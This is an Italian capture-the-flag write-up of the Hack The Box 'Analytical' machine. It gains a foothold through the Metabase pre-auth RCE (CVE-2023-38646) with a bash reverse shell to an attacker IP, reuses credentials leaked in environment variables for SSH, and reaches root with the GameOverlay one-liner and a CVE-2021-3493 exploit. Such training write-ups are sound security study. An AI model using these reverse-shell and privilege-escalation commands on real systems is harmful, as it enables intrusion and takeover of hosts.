**TARGET:10.10.11.233**

# INFORMATION GATHERING

Per prima cosa lanciamo un rapido scan con [Nmap](Note/Tool/Nmap.md)
```bash
┌──(root㉿kali)-[/home/kali/htb/analytical]
└─# nmap -sV -sC --min-rate=5000 10.10.11.233
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-06 17:03 EST
Nmap scan report for 10.10.11.233
Host is up (1.2s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://analytical.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.13 seconds
```

Abbiamo 2 porte aprte

- 22 ssh OpenSSH 8.9p1 (le vulnerabilità note sono per le versione precedneti)
- 80 http nginx 1.18.0

uno scan completo su tutte le porte non ci da nessuna nuova informazione.

# ENUMERATION

# Port 80

Visitiamo `10.10.11.233` 
![](Hackthebox-OSCP-Prepartion/zzz_rev/attachments/analytican.png)
notiamo subito il nome `analytical.htb` che aggiungiamo al nostro `etc/hosts`
alla sezione `Contact` troviamo un email : demo@analytical.htb potrebbe essere utile.

Alla sezione login veniamo reindirizzati al seguente pagine 
![](Hackthebox-OSCP-Prepartion/zzz_rev/attachments/analytical1.png)
Notiamo l'indirizzo `data.analytical.htb` abbiamo un subdomino, possiamo verificalo anche con gobuster
```bash

┌──(root㉿kali)-[/home/kali]
└─# gobuster dns -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -d analytical.htb
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Domain:     analytical.htb
[+] Threads:    10
[+] Timeout:    1s
[+] Wordlist:   /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
===============================================================
2023/11/06 16:59:39 Starting gobuster in DNS enumeration mode
===============================================================
Found: data.analytical.htb

Progress: 600 / 4990 (12.02%)^C
[!] Keyboard interrupt detected, terminating.

===============================================================
2023/11/06 16:59:56 Finished
===============================================================
```

# GAINING AN INITIAL FOOTHOLD 

Ho provato ad accedere col credenziali standard come admim:admin, ecc.. e anche l'indirizzo email trovato in precedenza ma non ho ottenuto nessun accesso.

Notiamo che il software si chiama Metabase cerchiamo su google se troviamo qualcosa 
Ho trovato [questa](https://github.com/m3m0o/metabase-pre-auth-rce-poc)repo su git hub dove si fa riferimento alla  CVE-2023-38646 Metabase Pre-Auth RCE 

Scarichiamo e vediamo se funziona.

Dalla info nel README.md  vediamo che lo script python a bisogno di 3 parametri 
- -u = url 
- -t = setup token
- -c = command

il setup token  può essere ottenuto tramite l'endpoint /api/session/properties. 
![](Hackthebox-OSCP-Prepartion/zzz_rev/attachments/analytical3.htb.png)

come comando mettiamo la seguente revshell
```bash
bash -i >& /dev/tcp/10.10.14.37/443 0>&1
```

ci mettiamo in ascolto con nc 
```bash
┌──(root㉿kali)-[/home/kali/htb/analytical]
└─# nc -lvnp 443
listening on [any] 443 ...
```

impostiamo lo script e lo eseguiamo 

```bash
┌──(root㉿kali)-[/home/kali/htb/analytical/metabase-pre-auth-rce-poc]
└─# python3 main.py -u http://data.analytical.htb -t 249fa03d-fd94-4d5b-b94f-b4ebf3df681f -c "bash -i >& /dev/tcp/10.10.14.37/443 0>&1"
[!] BE SURE TO BE LISTENING ON THE PORT YOU DEFINED IF YOU ARE ISSUING AN COMMAND TO GET REVERSE SHELL [!]

[+] Initialized script
[+] Encoding command
[+] Making request
[+] Payload sent

```

otteniamo cosi la nostra revshell

```bash
┌──(root㉿kali)-[/home/kali/htb/analytical]
└─# nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.37] from (UNKNOWN) [10.10.11.233] 38360
bash: cannot set terminal process group (1): Not a tty
bash: no job control in this shell
501f3d513028:/$ id
id
uid=2000(metabase) gid=2000(metabase) groups=2000(metabase),2000(metabase)
501f3d513028:/$
```

è una shell abbastanza limitata, come possiamo vedere con il comando ambiente `env`
```bash
501f3d513028:/$ env
env
SHELL=/bin/sh
MB_DB_PASS=
HOSTNAME=501f3d513028
LANGUAGE=en_US:en
MB_JETTY_HOST=0.0.0.0
JAVA_HOME=/opt/java/openjdk
MB_DB_FILE=//metabase.db/metabase.db
PWD=/
LOGNAME=metabase
MB_EMAIL_SMTP_USERNAME=
HOME=/home/metabase
LANG=en_US.UTF-8
META_USER=metalytics
META_PASS=An4lytics_ds20223#
MB_EMAIL_SMTP_PASSWORD=
USER=metabase
SHLVL=4
MB_DB_USER=
FC_LANG=en-US
LD_LIBRARY_PATH=/opt/java/openjdk/lib/server:/opt/java/openjdk/lib:/opt/java/openjdk/../lib
LC_CTYPE=en_US.UTF-8
MB_LDAP_BIND_DN=
LC_ALL=en_US.UTF-8
MB_LDAP_PASSWORD=
PATH=/opt/java/openjdk/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
MB_DB_CONNECTION_URI=
JAVA_VERSION=jdk-11.0.19+7
_=/usr/bin/env
501f3d513028:/$
```

possiamo vedere che che abbiamo un nome utente `metalytics` e una password `An4lytics_ds20223#
Usiamole per collegarci tramite ssh

```bash
┌──(root㉿kali)-[/home/kali/htb/analytical]
└─# ssh metalytics@10.10.11.233
metalytics@10.10.11.233's password:
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 6.2.0-25-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Nov  7 09:11:24 PM UTC 2023

  System load:              0.81982421875
  Usage of /:               93.9% of 7.78GB
  Memory usage:             29%
  Swap usage:               0%
  Processes:                157
  Users logged in:          0
  IPv4 address for docker0: 172.17.0.1
  IPv4 address for eth0:    10.10.11.233
  IPv6 address for eth0:    dead:beef::250:56ff:feb9:cf7b

  => / is using 93.9% of 7.78GB


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Tue Nov  7 12:52:44 2023 from 10.10.14.22
metalytics@analytics:~$metalytics@analytics:~$ id
uid=1000(metalytics) gid=1000(metalytics) groups=1000(metalytics)
```

Abbiamo la nostra user_flag

```
metalytics@analytics:~$ ls
CVE-2021-4034.py  user.txt
metalytics@analytics:~$ cat user.txt
5f6239bde86194fd50cef62db4123490
```

# PRIVESC

Scarichiamo sulla macchina [LinEPAS.sh](LinEPAS.sh) ed eseguiamo, alla voce System information troviamo la versione di Linux Ubuntu 22.04.3 LTS
```bash
══════════════════════════════╣ System Information ╠══════════════════════════════
                              ╚════════════════════╝
╔══════════╣ Operative system
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#kernel-exploits
Linux version 6.2.0-25-generic (buildd@lcy02-amd64-044) (x86_64-linux-gnu-gcc-11 (Ubuntu 11.3.0-1ubuntu1~22.04.1) 11.3.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #25~22.04.2-Ubuntu SMP PREEMPT_DYNAMIC Wed Jun 28 09:55:23 UTC 2
Distributor ID: Ubuntu
Description:    Ubuntu 22.04.3 LTS
Release:        22.04
Codename:       jammy
```

Cercano su google per la versione `Ubuntu 22.04.3 LTS` troviamo [Questo](https://www.crowdstrike.com/blog/crowdstrike-discovers-new-container-exploit/) post
dove si parla di due CVE. LA  [**CVE-2023–2640**](https://www.crowdstrike.com/blog/crowdstrike-discovers-new-container-exploit/)e la  [**CVE-2023–32629**](https://www.crowdstrike.com/blog/crowdstrike-discovers-new-container-exploit/).

## CVE -2023-2640

Partiamo dalla prima 

```bash
metalytics@analytics:~$ unshare -rm sh -c "mkdir 1 u w m && cp /u*/b*/p*3 1/; setcap cap_setuid+eip 1/python3;mount -t overlay overlay -o rw,lowerdir=1,upperdir=u,workdir=w, m && touch m/*;" && u/python3 -c 'import pty; import os;os.setuid(0); pty.spawn("/bin/bash")'
mkdir: cannot create directory ‘1’: File exists
mkdir: cannot create directory ‘u’: File exists
mkdir: cannot create directory ‘w’: File exists
mkdir: cannot create directory ‘m’: File exists
Failed to set capabilities on file `1/python3' (No such file or directory)
The value of the capability argument is not permitted for a file. Or the file is not a regular (non-symlink) file
root@analytics:~# id
uid=0(root) gid=1000(metalytics) groups=1000(metalytics)
```

Nel mio caso, la CVE-2023–2640 si è rivelata subito efficace ed è stato ottenuto l'accesso root.

e ci prendiamo la nostra root_flag
```bash
root@analytics:~# cat /root/root.txt
5d94322c58e7914aea78481289b35403
```


# CVE-2021-3493

Cercando ancora su google troviamo anche questa [CVE-2021-3493](https://www.exploit-db.com/docs/49916) dove troviamo tutto il materiale per procedere.

una volta scaricato la repo da GitHub dobbiamo compilare l'exploit

```bash
┌──(root㉿kali)-[/home/kali/htb/analytical/CVE-2021-3493]
└─# gcc exploit.c -o exploit

┌──(root㉿kali)-[/home/kali/htb/analytical/CVE-2021-3493]
└─# ls
exploit  exploit.c  README.md
```

lo copiamo sull target con wget ed eseguiamo 

```bahs
metalytics@analytics:~$ ls
CVE-2021-4034.py  exploit  LinPEAS.sh  ovlcap  user.txt
metalytics@analytics:~$ ./exploit
bash-5.1# id
uid=0(root) gid=0(root) groups=0(root),1000(metalytics)

```

